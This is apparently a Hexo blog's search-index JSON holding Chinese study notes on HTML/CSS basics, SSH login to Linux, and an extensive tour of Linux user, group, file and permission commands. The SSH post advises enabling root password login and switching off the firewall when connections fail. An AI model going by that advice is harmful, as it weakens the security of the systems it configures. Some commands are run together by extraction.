{"meta":{"title":"hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"12-02","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"12-02","excerpt":""},{"title":"#新建页面","text":"","path":"新建页面/index.html","date":"12-03","excerpt":""}],"posts":[{"title":"HTML5的基本知识","text":"! 按tab键 &lt;title&gt; 标题 &lt;body&gt; 网页内容 一些命令的用法 Html使用style的四种方法 直接在html的标签里加入 &lt;header style = &quot;background-color:blue;&quot;&gt;HELLO&lt;/header&gt; 在使用该style的html文本里添加 .header{ text-align:center; background-color:lightblue; height:50px; } HELLO 新建一个style.css文档（任意名字，但文件类型一定是.css）,然后在需要使用该style的html文本里将它链接进来 1234.header&#123; background-color:red; height:50px;&#125; 然后在html文件中把style.css链接进来 …… Jan's website HELLO import方法 (1)如果有两个css文件，比如一个是header.css,一个是style.css，想要在style.css中调用header.css，可以在style.css文件中将它import进去 @imoort &quot;header.css&quot; (2)在html文件中直接import：@import url(“style.css”)或@import “style.css” 5/text123&lt;style&gt; @import url(&quot;style.css&quot;);&lt;style&gt;","path":"2023/12/10/HTML5/","date":"12-10","excerpt":"","tags":[]},{"title":"ssh远程登陆Linux","text":"打开Linux系统输入 systemctl enable sshd systemctl start sshd vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config 按esc键，输入 :set nu（显示行号） 找到38行去掉# 在这行末尾没有yes需添加 PermitRootLogin yes systemctl restart sshd ip add(查看ip) 在另外设备上按win+R，输入cmd打开命令行 在命令行输入ssh root@ip（如果报错，可能是防火墙原因，需关闭） 输入Linux系统的密码登录","path":"2023/12/06/ssh_denglu_Linux/","date":"12-06","excerpt":"","tags":[]},{"title":"Linux的学习","text":"相关知识一、Linux目录结构介绍对Linux文件系统目录结构的了解是学习和掌握Linux系统的基础。Linux 文件系统是树形层次结构，具体如下图所示。 二、Linux用户介绍Linux用户通常分为两类: 管理员用户(root)； 普通用户(类似Windows上的普通用户)。 Linux登录系统后，默认当前所在目录为用户主目录，类似Windows登录系统后，默认的所在目录为桌面。 管理员(root)登录系统后默认目录为&#x2F;root； 普通用户登录系统后默认目录为&#x2F;home&#x2F;username， username为用户名。 例如：笔者用普通用户fzm登录系统后，那么当前所在目录为。&#x2F;home&#x2F;fzm。 三、Linux权限说明Linux系统中的每个文件都有访问许可权限，文件的访问权限分为只读，只写和可执行三种。 只读权限表示只允许读其内容，而禁止对其做任何的更改操作。 只写权限表示允许修改文件的内容。 可执行权限表示允许将该文件作为一个程序执行。 每一文件的访问权限都有三组，每组用三位表示，分别为文件所属主的读、写和执行权限；与属主同组的用户的读、写和执行权限；系统中其他用户的读、写和执行权限。 当用ls -l或ll命令显示文件的详细信息时，最左边的一列为文件的访问权限。例如显示test文件详细信息： 四、setuid,setgidLinux中文件&#x2F;目录除了有可读、可写和可执行这三种权限外，还存在比较特殊的权限，这些特殊权限就包括setuid和setgid这两种。 setuid和setgid位是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令。例如我们用普通用户运行passwd命令来更改自己的口令，实际上最终更改的是/etc/passwd文件，我们知道/etc/passwd文件是用户管理的 配置文件，只有root权限的用户才能更改，正是因为passwd命令被设置了setuid权限才能使得普通用户也可以修改其配置文件的内容。 Linux文件&#x2F;目录权限是使用常见的八进制权限掩码来表示的，通常都是用三位数表示，但确切地说，它是用四位数表示的，因为除了读、写和执行权限以外还有特殊的权限。 setuid的八进制表示为4000 setgid的八进制表示为2000 同样setuid和setgid也可以使用字母s表示。 如果文件&#x2F;目录的拥有者的可执行位是s，则表示该文件&#x2F;目录被设置了setuid权限。同样，如果同组用户的可执行为是s，则表示该文件&#x2F;目录被设置了setgid权限。 五、sticky bitLinux中目录除了有可读、可写和可执行这三种权限外，还存在比较特殊的权限，这些特殊权限包括上一关卡讲解的setuid和setgid这两种，还有一种就是本关讲解的**粘滞位sticky bit**。 我们知道Linux的/tmp目录是系统的临时文件目录，所有的用户在该目录下拥有所有的权限，也就是说在该目录下可以任意创建、修改、删除文件，那如果用户A在该目录下创建了一个文件，用户B将该文件删除了，这种情况我们是不能允许的。为了达到该目的，就出现了stick bit（粘滞位）的概念。它是针对目录来说的，如果该目录设置了stick bit（粘滞位），则该目录下的文件除了该文件的创建者和root用户可以删除和修改，别的用户均不能删除和修改，这就是粘滞位的作用。 Linux目录权限使用常见的八进制权限掩码来表示的，通常都是用三位数表示，但确切地说，它是用四位数表示的，因为除了读、写和执行权限以外还有特殊的权限。 sticky bit的八进制表示为1000 同样sticky bit也可以使用字母表示，使用t表示。 如果目录的其他用户的可执行位是t，则表示该目录被设置了sticky bit权限。 接下让我们详细的学习目录的sticky bit的使用方法。 命令使用1.pwd命令pwd(Print Working Directory )：显示当前所在目录。 2.cd命令cd(Change Directory): 切换当前目录。 常用特殊目录表示： cd 进入用户主目录； cd ~ 进入用户主目录； cd - 返回进入此目录之前所在的目录； cd .. 返回上级目录(若当前目录为”&#x2F;“，则执行完后还在”&#x2F;“；”..”为上级目录的意思)； cd ..&#x2F;.. 返回上两级目录； cd !$ 把上个命令的参数作为cd参数使用。 3.ls命令ls(list): 列出指定目录列表信息，如果没有参数默认列出当前目录下的所有文件和文件夹(隐藏文件和文件夹除外)。 常见ls命令选项: -l：以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等； -a：显示所有文件和文件夹(包括隐藏文件&#x2F;文件夹)。 4.创建文件linux中创建文件的常用命令是touch，命令格式如下: touch filename 如果想同时创建多个文件也可以使用touch命令完成，具体格式如下： touch file1 file2 … 5.删除文件Linux中常用的删除文件的命令是rm，使用格式如下： rm [命令选项] filename 常用命令选项： -f：强制删除文件或目录； -r或-R：递归处理，将指定目录下的所有文件与子目录一并处理； -i：删除已有文件或目录之前先询问用户。 6.创建文件夹Linux中创建文件夹命令是mkdir，命令格式如下： mkdir [命令选项] dirname 常用命令选项： -p或–parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录； 7.删除文件夹Linux中删除文件夹的命令是rmdir或者rm -r，命令格式如下： rmdir [命令选项] dirname 常用命令选项：-p或–parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除； 8.Linux文件和文件夹拷贝Linux使用cp命令用来将一个或多个源文件或者目录复制到指定的目录中，命令格式如下： cp [命令选项] 源文件 目的文件 常用命令选项： -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性； -R&#x2F;r：递归处理，将指定目录下的所有文件与子目录一并处理。 9.Linux文件和文件夹移动&#x2F;重命名Linux使用mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中，命令格式如下： mv [命令选项] 源文件 目标文件 常用命令选项： -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性； -R&#x2F;r：递归处理，将指定目录下的所有文件与子目录一并处理’。 10.Linux man命令linux中使用man命令来查询命令的帮助文件,命令格式如下: man [章节] command 常用命令如下： d,Ctrl+D:向文件尾部翻半屏； u,Ctrl+U:向文件首部翻半屏； q:退出； #：跳转至第#行； home:回到文件首部； end：翻至文件尾部。 命令的帮助文件通常存放在&#x2F;usr&#x2F;share&#x2F;man目录下。 man包含9个章节，章节用数字表示，分别是： 用户命令 系统调用 C库调用 设备文件及特殊文件 配置文件格式 游戏 杂项 管理类的命令 Linux内核API 如果查询命令的时候不追加章节，则默认从第一个章节开始查询，以此类推，直到找到对应要查询的命令为止。 11.Linux info命令linux中使用info命令来查询命令的帮助文件。info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。 命令格式如下：info [命令参数] command 常用命令参数选项： -d：添加包含info格式帮助文档的目录； -f：指定要读取的info格式的帮助文档； -n：指定首先访问的info帮助文件的节点； -o：输出被选择的节点内容到指定文件。 常见命令如下： ?键：它就会显示info的常用快捷键； N键：显示（相对于本节点的）下一节点的文档内容； P键：显示（相对于本节点的）前一节点的文档内容； U键：进入当前命令所在的主题； M键：敲M键后输入命令的名称就可以查看该命令的帮助文档了； G键：敲G键后输入主题名称，进入该主题； L键：回到上一个访问的页面； SPACE键：向前滚动一页； BACKUP或DEL键：向后滚动一页； Q：退出info。 12.Linux whatis命令whatis用来显示命令的简短描述。 命令格式如下：whatis command 13.Linux创建用户命令Linux中使用useradd命令来创建一个新用户。 命令格式格式：useradd [命令参数] 参数 常见命令参数： -d&lt;登入目录&gt;：指定用户登入时的启始目录； -D：查看或变更预设值； -g&lt;群组&gt;：指定用户所属的群组； -m：自动建立用户的登入目录； -M：不要自动建立用户的登入目录； -s：指定用户登入后所使用的shell。 useradd必须以root权限才能执行，如果是普通用户想创建一个新用户时，需要在命令前加sudo命令来提升权限为root权限。 14.Linux删除用户命令Linux中使用userdel命令来删除一个已经存在的用户。 命令格式：userdel [命令参数] 参数 常见命令参数： -f：强制删除用户，即使用户当前已登录； -r：删除用户的同时，删除与用户相关的所有文件。 userdel必须以root权限才能执行，如果是普通用户想使用该命令时，需要在命令前加sudo命令来提升权限为root权限。 15.使用passwd命令修改用户密码命令格式：passwd [命令参数] 参数 常见命令参数： -d 删除密码； -l 停止账号使用； -S 显示密码信息。 passwd必须以root权限才能执行，如果是普通用户想执行passwd时，需要在命令前加sudo命令来提升权限为root权限。 16.使用chpasswd命令修改用户密码chpasswd命令通常是用于批量修改用户密码，从标准输入批量读取成对的用户名和密码，其中输入的用户名和密码的格式为 用户名:密码 例如要批量更新用户密码，将用户名和密码写入到一个文件中，格式如下所示： 然后执行执行如下命令来更新密码： sudo chpasswd &lt; batch.txt &lt;符号表示输入重定向，接下来的实训中我们会详细的介绍。 命令格式：chpasswd [命令参数] 参数 常见命令参数 -e：输入的密码是加密后的密文； -h：显示帮助信息并退出。 chpasswd必须以root权限才能执行，如果是普通用户执行时，需要在命令前加sudo命令来提升权限为root权限。 17.使用login命令登录login命令是让用户登录系统，可通过它的功能随时更换登入身份。当&#x2F;etc目录里含名称为nologin的文件时，系统只允许root帐号登入系统，其他用户一律不准登入。 当使用login命令登录系统后，可以使用logout命令或者exit命令来退出当前用户登录，返回到登录前的用户状态。 命令格式：login [命令参数] 参数 参数为登录的用户名，可以不输入登录的用户名，直接输入login命令后回车，然后根据提示再输入用户名和密码。 常见命令参数 -p：告诉login指令不销毁环境变量； -h：指定远程服务器的主机名。 login必须以root权限才能执行，如果是普通用户执行时，需要在命令前加sudo命令来提升权限为root权限。 18.使用su命令切换用户身份su命令用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号的密码。 当使用su命令切换用户后，使用exit命令退出当前身份，返回原有登录用户身份。 注：如果当前用户身份是root，则使用su命令切换到其他用户的时候不需要相应用户的密码 命令格式：su [命令参数] 参数 参数为登录的用户名，如果没有参数，则默认切换为root用户。 常见命令参数 -c&lt;指令&gt;或–command&#x3D;&lt;指令&gt;：执行完指定的指令后，即恢复原来的身份； -l或–login：改变身份时，也同时变更工作目录，以及HOME,SHELL,USER,logname。此外，也会变更PATH变量； -m,-p或–preserve-environment：变更身份时，不要变更环境变量； -s或–shell&#x3D;：指定要执行的shell。 su命令所有使用者都可以执行。 19.Linux创建用户组命令Linux 中使用groupadd命令来创建一个新用户组。 命令格式：groupadd [命令参数] 参数 常见命令参数： -g：指定新建工作组的id； -r：创建系统工作组，系统工作组的组ID小于500； groupadd必须以root权限才能执行，如果是普通用户想使用该命令，需要在命令前加sudo命令来提升权限为root权限。 在背景介绍中，我们了解到，Linux中用户组信息是保存在&#x2F;etc&#x2F;group文件中，我们可以使用命令tail &#x2F;etc&#x2F;group命令查看&#x2F;etc&#x2F;group文件最后10行中是否存在刚刚新创建的testGroup用户信息。 注意：我们可以看到有时执行sudo命令就不需要输入密码，这是因为每次都输入密码比较麻烦，所以Linux会设置一个sudo的会话时间，就是说我们在第一次执行sudo的时候是要输入密码，那么在接下来的一段时间内在执行sudo的时候就不需要输入密码，这个会话时间默认是5分钟，用户也可以通过编辑&#x2F;etc&#x2F;sudoers来修改这个会话时间的大小。 20.Linux删除用户组命令Linux 中使用groupdel命令来删除一个已经存在的用户组。 命令格式：groupdel 参数 参数为要删除的用户组名 groupdel必须以root权限才能执行，如果是普通用户想使用该命令，需要在命令前加sudo命令来提升权限为root权限。 22.Linux查看用户所属组Linux中查看一个用户所属的组两种方法。 使用id命令查看。命令格式：id [命令参数] 参数 参数为要查询的用户名，默认是当前登录用户。 常见命令参数： -g或–group：显示用户所属群组的ID； -G或–groups：显示用户所属附加群组的ID； -n或–name：显示用户，所属群组或附加群组的名称。 使用group命令查看。命令格式：groups 参数 参数为要查询的用户名，默认是当前登录用户。 23.Linux修改用户所属组使用usermod命令修改用户组如果要一个用户仅仅属于某一个组，而不是同时属于多个组，则使用如下命令： 命令格式：usermod -g 组名 用户名 如果要给一个用户添加一个新的组，同时保留原来有所的组，则使用如下命令： 命令格式：usermod -a -G 组名 用户名 usermod必须以root权限才能执行，如果是普通用户想执行usermod时，需要在命令前加sudo命令来提升权限为root权限。 使用useradd命令创建用户的时候指定用户组在创建新用户的同时可以修改默认用户所属组，如果想在创建的时候直接将用户所属组修改成系统中已经存在的一个组，而不是使用默认私有组，则使用如下命令： 命令格式：useradd -g 组名 用户名 在创建新用户的同时可以为用户添加其它组，如果想在创建新用户的时候为用户添加一个已经存在的组，而不仅只属于默认创建的私有组，则使用如下命令： 命令格式：useradd -G 组名 用户名 useradd必须以root权限才能执行，如果是普通用户执行时，需要在命令前加sudo命令来提升权限为root权限。 24.Linux查看用户属性命令Linux中使用id命令可以查看用户的大多数信息。具体使用方法请参看上一关的实训。 Linux中还可以通过查看&#x2F;etc&#x2F;passwd文件来获取用户的信息。具体方法可以参考背景知识。 Linux中还可以使用finger命令来查询用户的信息。 注意：Ubuntu系统中默认没有安装finger命令，用户可以通过以下命令来安装finger，然后就可以使用finger。 sudo apt-get install finger 具体使用方法如下： 命令格式：finger [命令参数] 参数 常见命令参数 -l：多行显示； -s：单行显示。这个选项只显示登入名称、真实姓名、终端机名称、闲置时间、登入时间、办公室号码及电话号码。如果所查询的使用者是远端服务器的使用者，这个选项无效。 25.Linux用户信息修改命令Linux 中usermod命令是最强大的用户账户修改实用工具。 usermod命令我们在上一关只是简单的用到其-g、-G参数对用户的所属组进行修改，本关我们将进一步使用usermod命令的其它属性进行修改更多的属性。 命令格式：usermod [命令参数] 参数 常见命令参数： -c&lt;备注&gt;：修改用户帐号的备注文字； -d&lt;登入目录&gt;：修改用户登入时的目录； -e&lt;有效期限&gt;：修改帐号的有效期限； -f&lt;缓冲天数&gt;：修改在密码过期后多少天即关闭该帐号； -g&lt;群组&gt;：修改用户所属的群组； -G&lt;群组&gt;；修改用户所属的附加群组； -l&lt;帐号名称&gt;：修改用户帐号名称； -L：锁定用户密码，使密码无效； -s：修改用户登入后所使用的shell； -u：修改用户ID； -U:解除密码锁定。 usermod必须以root权限才能执行，如果是普通用户想使用该命令时，需要在命令前加sudo命令来提升权限为root权限。 26.Linux用户组信息修改命令Linux 中使用groupmod命令来修改用户组信息。 命令格式：groupmod [命令参数] 参数 常见命令参数： -g&lt;群组识别码&gt;：设置欲使用的群组识别码； -n&lt;新群组名称&gt;：设置欲使用的群组名称。 groupmod必须以root权限才能执行，如果是普通用户想使用该命令时，需要在命令前加sudo命令来提升权限为root权限。 27.Linux创建文件Linux中使用touch命令来创建一个空文件。 具体命令如下：touch 文件名 具体说明： 如果一次想创建多个文件，则每个文件名用空格隔开。 touch命令创建一个指定的新文件，并将当前登录用户作为文件所有者。 由于touch命令创建的文件为空，所以文件的大小为0。 touch命令还可以用于更改文件的访问时间和修改时间，而不改变文件的内容。 28.Linux删除文件Linux中使用rm命令来删除一个已经存在的文件。 具体命令如下：rm 参数 文件名 常用参数如下： -f：强制删除文件或目录； -i：删除已有文件或目录之前先询问用户； -r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；-i：删除已有文件或目录之前先询问用户。 具体说明： 如果一次想删除多个文件，则每个文件名用空格隔开。 rm命令可以使用通配符来删除文件。 29.Linux创建目录Linux中使用mkdir命令来创建一个空目录。 具体命令如下：mkdir 参数 目录名 常用参数如下： -p或–parents：若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录。 具体说明： 如果一次想创建多个目录，则每个目录名用空格隔开。 mkdir命令创建一个指定的目录，并将当前登录用户作为目录所有者。 mkdir命令创建一个空目录后，该目录下只存在两个特殊的目录，分别是.和..。 30.Linux删除目录Linux中使用rmdir命令来删除一个已经存在的空目录。 具体命令如下：rmdir 参数 目录名 常用参数如下： -p或–parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除； 具体说明： 如果一次想删除多个空目录，则每个目录名用空格隔开。 rmdir命令可以使用通配符来删除目录。 如果想删除的目录不为空，则先使用rm命令将目录下的所有文件都清空，然后再使用rmdir将目录删除，或者直接使用rm -r命令直接递归的删除整个目录。 31.Linux拷贝文件Linux中使用cp命令将一个或多个源文件复制到指定的目的目录下。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。 具体命令如下：cp 参数 源文件 目的目录 常用参数如下： -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性。 具体说明： cp命令支持同时复制多个文件，当一次复制多个文件时，目的目录参数必须是一个已经存在的目录，否则将出现错误； cp命令支持同时复制多个文件，当一次复制多个文件时，多个文件用空格分隔。 (1)将当前目录下的一个文件拷贝到一个指定的目录下，文件名为：newFile，目录名为：newDir，则可以使用如下命令： cp newFile newDir (2)将当前目录下的一个文件拷贝到一个指定的目录下并重命名为newFileCpy，文件名为：newFile，目录名为：newDir，则可以使用如下命令： cp newFile newDir&#x2F;newFileCpy (3)将当前目录下的一个文件拷贝到一个指定的目录下并重命名为newFileCpy，文件名为：newFile，目录名为：newDir，则可以使用如下命令： cp newFile newDir&#x2F;newFileCpy 32.Linux重命名文件Linux中使用mv命令来重命名一个文件名。 mv命令还可以用来移动文件，类似于Windows上的剪切功能。 具体命令如下：mv 参数 目录名 常用参数如下： -f：若目标文件与现有的文件重复，则直接覆盖现有的文件； -i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。 具体说明： 如果一次想移动多个文件，则每个文件名用空格隔开； mv命令可以使用通配符来移动目录。 （1）将当前目录下的文件newFile重命名为newFileRename，则可以使用如下命令: mv newFile newFileRename （2）将当前目录下的文件newFileRename移动到一个指定的目录下，目录名为：Dir，则可以使用如下命令： mv newFileRename Dir （3）将当前目录下的文件newFileRename移动到一个指定的目录下并重命名为newFile，目录名为：Dir，则可以使用如下命令： mv newFileRename Dir&#x2F;newFile 32.Linux拷贝目录Linux中使用cp -r命令将一个或多个源目录复制到指定的目录下。它可以将单个源目录复制成一个指定目录名的具体的目录或一个已经存在的目录下。 具体命令如下：cp 参数 源目录 目的目录 常用参数如下： -r 是递归把源目录下的目录递归进行移动； -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性； 具体说明： cp命令支持同时复制多个目录，当一次复制多个目录时，目的目录参数必须是一个已经存在的目录，否则将出现错误； cp命令支持同时复制多个目录，当一次复制多个目录时，多个目录名用空格分隔； cp命令拷贝目录和拷贝文件大致用法相似，最大差别就是拷贝目录的时候必须加上-r参数，而拷贝文件的时候不需要加-r参数。 33.Linux重命名目录Linux中使用mv命令来重命名一个目录名。 mv命令还可以用来移动目录，类似于Windows上的剪切功能。 具体命令如下：mv 参数 源目录 目的目录 常用参数如下： -f：若目标目录与现有的目录重复，则直接合并现有的目录； -i：交互式操作，覆盖前先行询问用户，如果源目录与目标目录同名，则询问用户是否合并目标目录。用户输入”y”，表示将合并目标目录；输入”n”，表示取消对源目录的移动。这样可以避免误将目录覆盖。 具体说明： 如果一次想移动多个目录，则每个目录名用空格隔开。 mv命令可以使用通配符来移动目录。 mv命令移动目录和移动文件的使用大致一样，唯一不同的是如果出现源目录和目标目录重名，则采用合并的方式，而对于文件则是直接覆盖。 34.Linux查看文件内容Linux中查看文件内容的命令有很多，接下来我们介绍常用的几个命令。 cat命令具体命令如下：cat 参数 文件名 常用参数如下： -n 或 –number：由1开始对所有输出的行数编号； -b 或 –number-nonblank：和-n相似，只不过对于空白行不编号。 具体说明： cat命令支持同时查看多个文件，当一次查看多个文件时，每个文件的内容都会被打印到屏幕上； cat命令不能对文件进行编辑操作，只能查看文件内容。 head命令具体命令如下：head 参数 文件名 常用参数如下： -n number：显示文件的前number行内容； 具体说明： head命令是从文件的开头显示内容，默认情况下只显示前10行的内容； head命令不能对文件进行编辑操作，只能查看文件内容。 tail命令具体命令如下：tail 参数 文件名 常用参数如下： -n number：显示文件的最后number行内容； 具体说明： tail命令是从文件的结尾显示内容，默认情况下只显示最后10行的内容； tail命令不能对文件进行编辑操作，只能查看文件内容。 35.Linux查看目录内容Linux中使用ls命令来查看一个目录下的内容。 具体命令如下：ls 参数 目录 常用参数如下： -a：显示所有档案及目录（ls内定将档案名或目录名称为“.”的视为影藏，不会列出）； -A：显示除隐藏文件“.”和“..”以外的所有文件列表； -l：列出内容的详细信息； -r：以文件名反序排列并输出目录内容列表； -s：显示文件和目录的大小，以区块为单位； -i：显示文件索引节点号（inode）。一个索引节点代表一个文件； -R：递归处理，将指定目录下的所有文件及子目录一并处理。 具体说明： 如果一次查看多个目录，则每个目录名用空格隔开。 36.Linux修改文件权限命令Linux中使用chmod命令来修改文件权限。 文字设定法具体命令如下： chmod ［who］ ［+ | - | &#x3D;］ ［mode] 文件名 who参数如下： u 表示“用户（user）”，即文件或目录的所有者； g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户； o 表示“其他（others）用户”； a 表示“所有（all）用户”，它是系统默认值。 操作符如下： +：添加某个权限； -：取消某个权限； &#x3D;：赋予给定权限并取消其他所有权限。 mode参数如下： r 可读； w 可写； x 可执行。 数字设定法具体命令如下： chmod ［mode］ 文件名 mode为具体的数字。 首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是u、g和o。 （1）将目录testDir的同组其他用户权限添加可执行权限，同时递归的将该目录下的所有文件或目录都添加可执行权限，可以使用如下命令： chmod -R g+x testDir （2）将目录testDir的权限设置为所有者可读可写可执行，同组用户设置为可读可执行，其他用户设置为可读可执行，可以使用如下命令： chmod 755 testDir 37.Linux修改文件所有者命令Linux中使用chown命令来修改文件所有者。 具体命令如下： 1chown 用户名/用户ID 文件名 执行权限： chown必须以root权限才能执行，如果是普通用户想执行chown时，需要在命令前加sudo命令来提升权限为root权限。 （1）首先创建一个新用户newUser，然后将系统中已存在的文件testFile的所有者设置为newUser，可以使用如下命令: 12sudo useradd newUsersudo chown newUser testFile （2）首先查看用户fzm的ID是多少，然后将系统中已存在的文件testFile的所有者设置为fzm，可以使用如下命令: 12id fzmsudo chown 1000 testFile 38.Linux修改目录所有者命令Linux中使用chown命令来修改目录所有者。 具体命令如下： 1chown 参数 用户名/用户ID 目录名 常见命令参数： -R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； --help：在线帮助； 执行权限 chown必须以root权限才能执行，如果是普通用户想执行chown时，需要在命令前加sudo命令来提升权限为root权限。 39.Linux修改文件所属组命令Linux中使用chgrp命令来修改文件所属组。 具体命令如下： 1chgrp 用户组名/组ID 文件名 执行权限 chgrp必须以root权限才能执行，如果是普通用户想执行chgrp时，需要在命令前加sudo命令来提升权限为root权限。 （1）首先创建一个新用户组newGroup，然后将系统中已存在的文件testFile的所属组设置为newGroup，可以使用如下命令: 12sudo groupadd newGroupsudo chgrp newGroup testFile 首先创建一个新用户组newGroup，然后将系统中已存在的文件testFile的所属组设置为newGroup，可以使用如下命令: 1sudo groupadd newGroup` `sudo chgrp newGroup testFile 首先创建一个新用户组newGroup，然后将系统中已存在的文件testFile的所属组设置为newGroup，可以使用如下命令: 1sudo groupadd newGroup` `sudo chgrp newGroup testFile （2）首先通过/etc/group查看用户组fzm的ID是多少，然后将系统中已存在的文件testFile的所属组设置为fzm，可以使用如下命令: 12cat /etc/group | grep fzmsudo chgrp 1000 testFile 40.Linux中也可以使用chown命令来修改文件的所属组。具体命令如下： 1chown:用户组名/组ID 文件名 如果用户想使用chown命令同时修改所有者和所属组信息，则可以使用如下： 1chown 用户名/用户名ID:用户组名/组ID 文件名 执行权限 chgrp必须以root权限才能执行，如果是普通用户想执行chgrp时，需要在命令前加sudo命令来提升权限为root权限。 （1）使用chown命令将系统已存在的文件testFile的所属组设置newGroup，可以使用如下命令: 1sudo chown :newGroup testFile （2）使用chown命令将系统已存在的文件testFile的所有者设置为newUser所属组设置为fzm，可以使用如下命令: 1sudo chown newUser:fzm testFile 41.Linux修改目录所属组命令Linux中使用chgrp命令来修改目录所属组。 具体命令如下： 1chgrp 参数 用户组名/组ID 目录名 常见命令参数： -R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； --help：在线帮助； 执行权限 执行权限 chgrp必须以root权限才能执行，如果是普通用户想执行chgrp时，需要在命令前加sudo命令来提升权限为root权限。 42.df命令详解df命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 具体命令如下： 1df 命令参数 参数 常用参数如下： -a或--all：包含全部的文件系统，包括系统特有的/proc等文件系统; -k : 以KB为单位显示各文件系统; -m : 以MB为单位显示各文件系统; -h : 以可读性较高的方式来显示信息; -i或--inodes：显示inode的信息。 （1）查看系统所有磁盘设备，默认是KB为单位，可以使用如下命令： 1df （2）使用-h选项以KB以上的单位来显示，可读性高，可以使用如下命令： 1df -h （3）将/etc目录下的可用的磁盘容量以易读的格式显示出来，可以使用如下命令： 1df -h /etc 43.du命令详解du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的。 具体命令如下： 1du 命令参数 参数 常用参数如下： -a : 列出所有的文件与目录容量，因为默认仅统计目录下面的文件量而已; -h : 以可读性较高的方式来显示信息; -k : 以KB为单位显示容量; -m : 以MB为单位显示容量; -s : 列出总量，不列出每个目录占用的容量。 注: 直接输入du命令没有加任何参数时，则du会分析当前所在目录的文件与目录所占用的磁盘空间，但是，实际显示时仅会显示目录容量。 44.Linux链接Linux中的链接类似于Windows的快捷方式，也就是很多的链接文件（link file）其实都指向同一个源文件(source file)。 Linux中链接文件又分为硬链接和软链接两种。 Linux硬链接 硬链接指通过索引节点来进行链接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在Linux中，多个文件名指向同一索引节点是存在的。一般这种链接就是硬链接。 硬链接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬链接到重要文件，以防止误删的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的链接。只删除一个链接并不影响索引节点本身和其它的链接，只有当最后一个链接被删除后，文件的数据块及目录的链接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬链接文件均被删除。 硬链接特点如下： 文件有相同的inode及data block； 只能对已存在的文件进行创建； 不能交叉文件系统进行硬链接的创建； 不能对目录进行创建， 只可对文件创建； 删除一个硬链接文件并不影响其他有相同inode号的文件。 具体命令如下： 1ln 源文件 目标文件 Linux软链接 软链接文件有类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号链接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。 与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的I节点号；而硬链接并没有建立新文件。 软链接特点如下： 源文件和目标文件有不相同的inode及data block； 软链接没有硬链接的限制，可以对目录文件做符号链接； 软链接可以在不同文件系统之间做软链接； 在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是l； 符号链接的大小是其链接文件的路径名中的字节数； 45.setuidsetuid的作用是让执行该命令的用户以该命令拥有者的权限去执行。 例如：普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件，正是因为passwd命令被设置了setuid权限，passwd命令的详细权限如下所示： 可以看到passwd命令的拥有者的可执行位是s，则说明passwd命令被设置了setuid权限。 设置setuid命令有两种方法，一种是数字设置，另一种是通过助记语法。（建议使用助记语法设置） 数字设置命令：chmod 4xxx 文件/目录 其中xxx表示文件&#x2F;目录的所有者、同组用户和其他用户的权限(读写执行)。 助记语法设置命令：chmod u [+|-] s 文件/目录 1+ 添加setuid权限；- 取消setuid权限； 注意：chmod命令的其他参数都可以与setuid权限设置结合使用。 在设置setuid前必须保证文件&#x2F;目录的所有者具有可执行权限，否则设置则无效。 执行权限：chmod必须以root权限才能执行，如果是普通用户想执行chmod时，需要在命令前加sudo命令来提升权限为root权限。 （1）创建一个新文件testFile，使用数字设置方法为文件testFile添加setuid权限，具体使用如下命令： 1234touch testFilels -l testFilesudo chmod 4764 testFilels -l testFile 第一条命令是创建新文件testFile； 第二条命令是查看testFile现有的权限； 第三条命令是在保证testFile原有权限的情况下为其添加setuid权限； 第四条命令是查看是否添加成功 （2）创建一个新目录testDir，使用助记语法设置方法为目录testDir添加setuid权限，具体使用如下命令： 123mkdir testDirsudo chmod u+s testDirls -l . （3）创建一个新文件testFile，使用助记语法为文件testFile添加setuid权限，具体使用如下命令： 123touch testFilesudo chmod u+x,u+s testFilels -l testFile 第一条命令是创建新文件testFile； 